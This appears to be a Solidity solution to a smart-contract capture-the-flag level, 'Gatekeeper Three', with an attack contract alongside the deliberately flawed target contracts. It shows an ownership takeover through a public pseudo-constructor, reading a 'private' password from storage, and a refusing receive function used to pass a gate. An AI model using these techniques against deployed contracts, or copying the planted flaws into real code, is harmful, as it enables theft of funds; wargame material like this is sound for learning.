// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/GatekeeperThree.sol';

contract HackGatekeeperThree {
    // Complete with instance's address
    GatekeeperThree originalContract = GatekeeperThree(payable(0x01A89E79BE5f7D4ae521B5fE31dE35d9c13854c3));

    // The first part it's going open gate one and set up gate 2 
    function setup() public {
      // This way we set owner to msg.sender
      originalContract.construct0r();
      // This way we create the SimpleTrick contract
      originalContract.createTrick();
    }

    // Before executing the function enter, we're going to get the second storage of the SimpleTrick contract
    // This second slot has the private variable password
    // We're going to pass it as a parameter of the getAllowance function
    // This way we open the gate two
    // -await contract.getAllowance(await web3.eth.getStorageAt(await contract.trick(), 2))
    

    // It's important to transfer 0.0015 ether to the GatekeeperThree address
    function hack() public payable {
      originalContract.enter();
    }

    // Because the GatekeeperThree contract it's going to make a send to this contract
    // We setup the return value of the receive function as false
    // This way we open gate three
    function receive() external payable returns(bool) {
      return false;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}